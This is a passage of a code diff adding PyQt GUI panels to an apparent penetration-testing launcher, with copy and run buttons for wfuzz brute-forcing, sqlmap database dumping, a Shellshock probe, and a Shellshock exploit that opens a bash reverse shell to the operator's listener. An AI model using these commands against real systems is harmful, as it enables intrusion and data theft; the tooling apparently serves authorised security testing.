+        if hasattr(self, 'wfuzzF_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Run)
+            self.wfuzzF_Scan1_Run.deleteLater()
+        self.wfuzzF_Scan1_Run = QPushButton()
+        self.wfuzzF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzF_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzF_Scan1.text() + "; bash"
+        self.wfuzzF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzF_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzF_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzF_Scan1_Run)
+        label_layout.addWidget(self.wfuzzF_Scan1)
+        self.tab2_container_layout.insertLayout(64, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzF_Scan2
+        if hasattr(self, 'wfuzzF_Scan2'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2)
+            self.wfuzzF_Scan2.deleteLater()
+        self.wfuzzF_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzF_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzF_Scan2 copy button
+        if hasattr(self, 'wfuzzF_Scan2_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Copy)
+            self.wfuzzF_Scan2_Copy.deleteLater()
+        self.wfuzzF_Scan2_Copy = QPushButton()
+        self.wfuzzF_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzF_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzF_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan2.text()))
+        self.wfuzzF_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan2 run button
+        if hasattr(self, 'wfuzzF_Scan2_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Run)
+            self.wfuzzF_Scan2_Run.deleteLater()
+        self.wfuzzF_Scan2_Run = QPushButton()
+        self.wfuzzF_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzF_Scan2_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzF_Scan2.text() + "; bash"
+        self.wfuzzF_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzF_Scan2_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzF_Scan2_Copy)
+        label_layout.addWidget(self.wfuzzF_Scan2_Run)
+        label_layout.addWidget(self.wfuzzF_Scan2)
+        self.tab2_container_layout.insertLayout(65, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzF_Scan3
+        if hasattr(self, 'wfuzzF_Scan3'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3)
+            self.wfuzzF_Scan3.deleteLater()
+        self.wfuzzF_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzF_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzF_Scan3 copy button
+        if hasattr(self, 'wfuzzF_Scan3_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Copy)
+            self.wfuzzF_Scan3_Copy.deleteLater()
+        self.wfuzzF_Scan3_Copy = QPushButton()
+        self.wfuzzF_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzF_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzF_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan3.text()))
+        self.wfuzzF_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan3 run button
+        if hasattr(self, 'wfuzzF_Scan3_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Run)
+            self.wfuzzF_Scan3_Run.deleteLater()
+        self.wfuzzF_Scan3_Run = QPushButton()
+        self.wfuzzF_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzF_Scan3_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzF_Scan3.text() + "; bash"
+        self.wfuzzF_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzF_Scan3_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan3 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzF_Scan3_Copy)
+        label_layout.addWidget(self.wfuzzF_Scan3_Run)
+        label_layout.addWidget(self.wfuzzF_Scan3)
+        self.tab2_container_layout.insertLayout(66, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzF_Scan4
+        if hasattr(self, 'wfuzzF_Scan4'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4)
+            self.wfuzzF_Scan4.deleteLater()
+        self.wfuzzF_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzF_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzF_Scan4 copy button
+        if hasattr(self, 'wfuzzF_Scan4_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Copy)
+            self.wfuzzF_Scan4_Copy.deleteLater()
+        self.wfuzzF_Scan4_Copy = QPushButton()
+        self.wfuzzF_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzF_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzF_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan4.text()))
+        self.wfuzzF_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan4 run button
+        if hasattr(self, 'wfuzzF_Scan4_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan4_Run)
+            self.wfuzzF_Scan4_Run.deleteLater()
+        self.wfuzzF_Scan4_Run = QPushButton()
+        self.wfuzzF_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzF_Scan4_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzF_Scan4.text() + "; bash"
+        self.wfuzzF_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzF_Scan4_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan4 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzF_Scan4_Copy)
+        label_layout.addWidget(self.wfuzzF_Scan4_Run)
+        label_layout.addWidget(self.wfuzzF_Scan4)
+        self.tab2_container_layout.insertLayout(67, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzF_spacer1
+        if hasattr(self, 'wfuzzF_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_spacer1)
+            self.wfuzzF_spacer1.deleteLater()
+        self.wfuzzF_spacer1 = QLabel()
+        self.wfuzzF_spacer1.setFixedWidth(40)
+        self.wfuzzF_spacer1.setFixedHeight(40)
+
+        # wfuzzF_spacer & divider layout
+        self.tab2_container_layout.insertWidget(68, self.wfuzzF_spacer1)
+
+# wfuzzUsers
+        if hasattr(self, 'wfuzzUsers'):
+            self.tab2_container_layout.removeWidget(self.wfuzzUsers)
+            self.wfuzzUsers.deleteLater()
+        self.wfuzzUsers = QLabel("[+ Wfuzz Users]")
+        self.wfuzzUsers.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(69,self.wfuzzUsers)
+
+        # wfuzzUsers_Scan1
+        if hasattr(self, 'wfuzzUsers_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1)
+            self.wfuzzUsers_Scan1.deleteLater()
+        self.wfuzzUsers_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403  \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzUsers_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzUsers_Scan1 copy button
+        if hasattr(self, 'wfuzzUsers_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Copy)
+            self.wfuzzUsers_Scan1_Copy.deleteLater()
+        self.wfuzzUsers_Scan1_Copy = QPushButton()
+        self.wfuzzUsers_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzUsers_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzUsers_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzUsers_Scan1.text()))
+        self.wfuzzUsers_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzUsers_Scan1 run button
+        if hasattr(self, 'wfuzzUsers_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzUsers_Scan1_Run)
+            self.wfuzzUsers_Scan1_Run.deleteLater()
+        self.wfuzzUsers_Scan1_Run = QPushButton()
+        self.wfuzzUsers_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzUsers_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzUsers_Scan1.text() + "; bash"
+        self.wfuzzUsers_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzUsers_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzUsers_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzUsers_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzUsers_Scan1_Run)
+        label_layout.addWidget(self.wfuzzUsers_Scan1)
+        self.tab2_container_layout.insertLayout(70, label_layout)
+        self.tab2_container_layout.addStretch()
+
+         # wfuzz_divider 1
+        if hasattr(self, 'wfuzz_divider1'):
+            self.tab2_container_layout.removeWidget(self.wfuzz_divider1)
+            self.wfuzz_divider1.deleteLater()
+        self.wfuzz_divider1 = QFrame()
+        self.wfuzz_divider1.setFrameShape(QFrame.HLine)
+        self.wfuzz_divider1.setLineWidth(3)
+        self.wfuzz_divider1.setStyleSheet("color: #20C20E;")
+        
+        # wfuzz_divider2
+        if hasattr(self, 'wfuzz_divider2'):
+            self.tab2_container_layout.removeWidget(self.wfuzz_divider2)
+            self.wfuzz_divider2.deleteLater()
+        self.wfuzz_divider2 = QFrame()
+        self.wfuzz_divider2.setFrameShape(QFrame.HLine)
+        self.wfuzz_divider2.setLineWidth(3)
+        self.wfuzz_divider2.setStyleSheet("color: #20C20E;")
+        
+        # wfuzz_spacer1
+        if hasattr(self, 'wfuzz_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzz_spacer1)
+            self.wfuzz_spacer1.deleteLater()
+        self.wfuzz_spacer1 = QLabel()
+        self.wfuzz_spacer1.setFixedWidth(40)
+        self.wfuzz_spacer1.setFixedHeight(40)
+        
+        # wfuzz_spacer2
+        if hasattr(self, 'wfuzz_spacer2'):
+            self.tab2_container_layout.removeWidget(self.wfuzz_spacer2)
+            self.wfuzz_spacer2.deleteLater()
+        self.wfuzz_spacer2 = QLabel()
+        self.wfuzz_spacer2.setFixedWidth(40)
+        self.wfuzz_spacer2.setFixedHeight(40)
+
+        # wfuzz_spacer & divider layout
+        self.tab2_container_layout.insertWidget(71, self.wfuzz_spacer1)
+        self.tab2_container_layout.insertWidget(72, self.wfuzz_divider1)
+        self.tab2_container_layout.insertWidget(73, self.wfuzz_divider2)
+        self.tab2_container_layout.insertWidget(74, self.wfuzz_spacer2)
+        self.tab2_container_layout.addStretch()
+
+
+# SQLMap
+        if hasattr(self, 'SQLMap'):
+            self.tab2_container_layout.removeWidget(self.SQLMap)
+            self.SQLMap.deleteLater()
+        self.SQLMap = QLabel("[+ SQLMap]")
+        self.SQLMap.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(75,self.SQLMap)
+
+        # SQLMap_Scan1
+        if hasattr(self, 'SQLMap_Scan1'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1)
+            self.SQLMap_Scan1.deleteLater()
+        self.SQLMap_Scan1 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl")
+        self.SQLMap_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # SQLMap_Scan1 copy button
+        if hasattr(self, 'SQLMap_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Copy)
+            self.SQLMap_Scan1_Copy.deleteLater()
+        self.SQLMap_Scan1_Copy = QPushButton()
+        self.SQLMap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.SQLMap_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.SQLMap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan1.text()))
+        self.SQLMap_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # SQLMap_Scan1 run button
+        if hasattr(self, 'SQLMap_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan1_Run)
+            self.SQLMap_Scan1_Run.deleteLater()
+        self.SQLMap_Scan1_Run = QPushButton()
+        self.SQLMap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.SQLMap_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.SQLMap_Scan1.text() + "; bash"
+        self.SQLMap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.SQLMap_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # SQLMap_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.SQLMap_Scan1_Copy)
+        label_layout.addWidget(self.SQLMap_Scan1_Run)
+        label_layout.addWidget(self.SQLMap_Scan1)
+        self.tab2_container_layout.insertLayout(76, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # SQLMap_Scan2
+        if hasattr(self, 'SQLMap_Scan2'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2)
+            self.SQLMap_Scan2.deleteLater()
+        self.SQLMap_Scan2 = QLabel(f"sqlmap -u http://{self.rhost}:{self.rport} --threads=2 --time-sec=10 --level=4 --risk=3 --dump")
+        self.SQLMap_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # SQLMap_Scan2 copy button
+        if hasattr(self, 'SQLMap_Scan2_Copy'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Copy)
+            self.SQLMap_Scan2_Copy.deleteLater()
+        self.SQLMap_Scan2_Copy = QPushButton()
+        self.SQLMap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.SQLMap_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.SQLMap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.SQLMap_Scan2.text()))
+        self.SQLMap_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # SQLMap_Scan2 run button
+        if hasattr(self, 'SQLMap_Scan2_Run'):
+            self.tab2_container_layout.removeWidget(self.SQLMap_Scan2_Run)
+            self.SQLMap_Scan2_Run.deleteLater()
+        self.SQLMap_Scan2_Run = QPushButton()
+        self.SQLMap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.SQLMap_Scan2_Run.setFixedSize(QSize(20,20))
+        command10 = self.SQLMap_Scan2.text() + "; bash"
+        self.SQLMap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.SQLMap_Scan2_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # SQLMap_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.SQLMap_Scan2_Copy)
+        label_layout.addWidget(self.SQLMap_Scan2_Run)
+        label_layout.addWidget(self.SQLMap_Scan2)
+        self.tab2_container_layout.insertLayout(77, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # sqlmap_divider 1
+        if hasattr(self, 'sqlmap_divider1'):
+            self.tab2_container_layout.removeWidget(self.sqlmap_divider1)
+            self.sqlmap_divider1.deleteLater()
+        self.sqlmap_divider1 = QFrame()
+        self.sqlmap_divider1.setFrameShape(QFrame.HLine)
+        self.sqlmap_divider1.setLineWidth(3)
+        self.sqlmap_divider1.setStyleSheet("color: #20C20E;")
+        
+        # sqlmap_divider2
+        if hasattr(self, 'sqlmap_divider2'):
+            self.tab2_container_layout.removeWidget(self.sqlmap_divider2)
+            self.sqlmap_divider2.deleteLater()
+        self.sqlmap_divider2 = QFrame()
+        self.sqlmap_divider2.setFrameShape(QFrame.HLine)
+        self.sqlmap_divider2.setLineWidth(3)
+        self.sqlmap_divider2.setStyleSheet("color: #20C20E;")
+        
+        # sqlmap_spacer1
+        if hasattr(self, 'sqlmap_spacer1'):
+            self.tab2_container_layout.removeWidget(self.sqlmap_spacer1)
+            self.sqlmap_spacer1.deleteLater()
+        self.sqlmap_spacer1 = QLabel()
+        self.sqlmap_spacer1.setFixedWidth(40)
+        self.sqlmap_spacer1.setFixedHeight(40)
+        
+        # sqlmap_spacer2
+        if hasattr(self, 'sqlmap_spacer2'):
+            self.tab2_container_layout.removeWidget(self.sqlmap_spacer2)
+            self.sqlmap_spacer2.deleteLater()
+        self.sqlmap_spacer2 = QLabel()
+        self.sqlmap_spacer2.setFixedWidth(40)
+        self.sqlmap_spacer2.setFixedHeight(40)
+
+        # sqlmap_spacer & divider layout
+        self.tab2_container_layout.insertWidget(78, self.sqlmap_spacer1)
+        self.tab2_container_layout.insertWidget(79, self.sqlmap_divider1)
+        self.tab2_container_layout.insertWidget(80, self.sqlmap_divider2)
+        self.tab2_container_layout.insertWidget(81, self.sqlmap_spacer2)
+        self.tab2_container_layout.addStretch()
+
+# shellshockTest
+        if hasattr(self, 'shellshockTest'):
+            self.tab2_container_layout.removeWidget(self.shellshockTest)
+            self.shellshockTest.deleteLater()
+        self.shellshockTest = QLabel("[+ Test for Shell Shock]")
+        self.shellshockTest.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(82,self.shellshockTest)
+
+        # shellshockTest_Scan1
+        if hasattr(self, 'shellshockTest_Scan1'):
+            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1)
+            self.shellshockTest_Scan1.deleteLater()
+        self.shellshockTest_Scan1 = QLabel("curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'")
+        self.shellshockTest_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # shellshockTest_Scan1 copy button
+        if hasattr(self, 'shellshockTest_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Copy)
+            self.shellshockTest_Scan1_Copy.deleteLater()
+        self.shellshockTest_Scan1_Copy = QPushButton()
+        self.shellshockTest_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.shellshockTest_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.shellshockTest_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockTest_Scan1.text()))
+        self.shellshockTest_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockTest_Scan1 run button
+        if hasattr(self, 'shellshockTest_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.shellshockTest_Scan1_Run)
+            self.shellshockTest_Scan1_Run.deleteLater()
+        self.shellshockTest_Scan1_Run = QPushButton()
+        self.shellshockTest_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.shellshockTest_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.shellshockTest_Scan1.text() + "; bash"
+        self.shellshockTest_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.shellshockTest_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockTest_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.shellshockTest_Scan1_Copy)
+        label_layout.addWidget(self.shellshockTest_Scan1_Run)
+        label_layout.addWidget(self.shellshockTest_Scan1)
+        self.tab2_container_layout.insertLayout(83, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # shellshockTest_spacer1
+        if hasattr(self, 'shellshockTest_spacer1'):
+            self.tab2_container_layout.removeWidget(self.shellshockTest_spacer1)
+            self.shellshockTest_spacer1.deleteLater()
+        self.shellshockTest_spacer1 = QLabel()
+        self.shellshockTest_spacer1.setFixedWidth(40)
+        self.shellshockTest_spacer1.setFixedHeight(40)
+
+        # shellshockTest_spacer & divider layout
+        self.tab2_container_layout.insertWidget(84, self.shellshockTest_spacer1)
+
+# shellshockExploit
+        if hasattr(self, 'shellshockExploit'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit)
+            self.shellshockExploit.deleteLater()
+        self.shellshockExploit = QLabel("[+ Exploit Shell Shock]")
+        self.shellshockExploit.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(85,self.shellshockExploit)
+
+        # shellshockExploit_Scan1
+        if hasattr(self, 'shellshockExploit_Scan1'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1)
+            self.shellshockExploit_Scan1.deleteLater()
+        self.shellshockExploit_Scan1 = QLabel("nc -nlvp " + self.lport)
+        self.shellshockExploit_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # shellshockExploit_Scan1 copy button
+        if hasattr(self, 'shellshockExploit_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Copy)
+            self.shellshockExploit_Scan1_Copy.deleteLater()
+        self.shellshockExploit_Scan1_Copy = QPushButton()
+        self.shellshockExploit_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.shellshockExploit_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.shellshockExploit_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan1.text()))
+        self.shellshockExploit_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockExploit_Scan1 run button
+        if hasattr(self, 'shellshockExploit_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan1_Run)
+            self.shellshockExploit_Scan1_Run.deleteLater()
+        self.shellshockExploit_Scan1_Run = QPushButton()
+        self.shellshockExploit_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.shellshockExploit_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.shellshockExploit_Scan1.text() + "; bash"
+        self.shellshockExploit_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.shellshockExploit_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockExploit_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.shellshockExploit_Scan1_Copy)
+        label_layout.addWidget(self.shellshockExploit_Scan1_Run)
+        label_layout.addWidget(self.shellshockExploit_Scan1)
+        self.tab2_container_layout.insertLayout(86, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # shellshockExploit_Scan2
+        if hasattr(self, 'shellshockExploit_Scan2'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2)
+            self.shellshockExploit_Scan2.deleteLater()
+        self.shellshockExploit_Scan2 = QLabel("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1' http://" + self.rhost + ":" + self.rport + "/cgi-bin/admin.cgi")
+        self.shellshockExploit_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # shellshockExploit_Scan2 copy button
+        if hasattr(self, 'shellshockExploit_Scan2_Copy'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Copy)
+            self.shellshockExploit_Scan2_Copy.deleteLater()
+        self.shellshockExploit_Scan2_Copy = QPushButton()
+        self.shellshockExploit_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.shellshockExploit_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.shellshockExploit_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.shellshockExploit_Scan2.text()))
+        self.shellshockExploit_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockExploit_Scan2 run button
+        if hasattr(self, 'shellshockExploit_Scan2_Run'):
+            self.tab2_container_layout.removeWidget(self.shellshockExploit_Scan2_Run)
+            self.shellshockExploit_Scan2_Run.deleteLater()
+        self.shellshockExploit_Scan2_Run = QPushButton()
+        self.shellshockExploit_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.shellshockExploit_Scan2_Run.setFixedSize(QSize(20,20))
+        command10 = self.shellshockExploit_Scan2.text() + "; bash"
+        self.shellshockExploit_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.shellshockExploit_Scan2_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # shellshockExploit_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.shellshockExploit_Scan2_Copy)
+        label_layout.addWidget(self.shellshockExploit_Scan2_Run)
+        label_layout.addWidget(self.shellshockExploit_Scan2)
+        self.tab2_container_layout.insertLayout(87, label_layout)
+        self.tab2_container_layout.addStretch()
+
+         # shellshock_divider 1
+        if hasattr(self, 'shellshock_divider1'):
+            self.tab2_container_layout.removeWidget(self.shellshock_divider1)
+            self.shellshock_divider1.deleteLater()
+        self.shellshock_divider1 = QFrame()
+        self.shellshock_divider1.setFrameShape(QFrame.HLine)
+        self.shellshock_divider1.setLineWidth(3)
+        self.shellshock_divider1.setStyleSheet("color: #20C20E;")
+        
+        # shellshock_divider2
+        if hasattr(self, 'shellshock_divider2'):
+            self.tab2_container_layout.removeWidget(self.shellshock_divider2)
+            self.shellshock_divider2.deleteLater()
+        self.shellshock_divider2 = QFrame()
+        self.shellshock_divider2.setFrameShape(QFrame.HLine)
+        self.shellshock_divider2.setLineWidth(3)
+        self.shellshock_divider2.setStyleSheet("color: #20C20E;")
+        
+        # shellshock_spacer1
+        if hasattr(self, 'shellshock_spacer1'):
+            self.tab2_container_layout.removeWidget(self.shellshock_spacer1)
+            self.shellshock_spacer1.deleteLater()
+        self.shellshock_spacer1 = QLabel()
+        self.shellshock_spacer1.setFixedWidth(40)
+        self.shellshock_spacer1.setFixedHeight(40)
+        
+        # shellshock_spacer2
+        if hasattr(self, 'shellshock_spacer2'):
+            self.tab2_container_layout.removeWidget(self.shellshock_spacer2)
+            self.shellshock_spacer2.deleteLater()
+        self.shellshock_spacer2 = QLabel()
+        self.shellshock_spacer2.setFixedWidth(40)
+        self.shellshock_spacer2.setFixedHeight(40)
+
+        # shellshock_spacer & divider layout
+        self.tab2_container_layout.insertWidget(88, self.shellshock_spacer1)
+        self.tab2_container_layout.insertWidget(89, self.shellshock_divider1)
+        self.tab2_container_layout.insertWidget(90, self.shellshock_divider2)
+        self.tab2_container_layout.insertWidget(91, self.shellshock_spacer2)
+        self.tab2_container_layout.addStretch()
+
 
 #################################################################################
 ##### LPE
